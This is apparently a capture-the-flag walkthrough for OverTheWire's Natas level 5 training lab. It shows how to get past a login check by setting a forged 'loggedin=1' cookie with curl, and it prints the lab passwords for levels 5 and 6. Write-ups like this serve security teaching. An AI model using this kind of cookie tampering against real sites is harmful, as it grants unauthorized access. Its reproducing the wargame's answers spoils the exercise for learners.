## Recap

* You'll get the password in level4. it's `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`

## Problem 

Username: natas5
URL:      http://natas5.natas.labs.overthewire.org

![image-20201001210950052](https://i.imgur.com/rl0Uv6l.png)

## Solution

* F12 and look cookies, you'll find the "loggedin" params. (Which usually is used to justify if user logged in or not.)

![image-20201001211010366](https://i.imgur.com/rznZlxB.png)

* Change it to 1 and resend. (Same technique in level4, but more concise).

```bash
curl 'http://natas5.natas.labs.overthewire.org/' \
  -H 'Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx' \
  -H 'Cookie: loggedin=1' \
  --compressed \
  --insecure ;
```

* Type in bash, find the token.
  * ![image-20201001211407975](https://i.imgur.com/9iFLNJv.png)
  * `Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`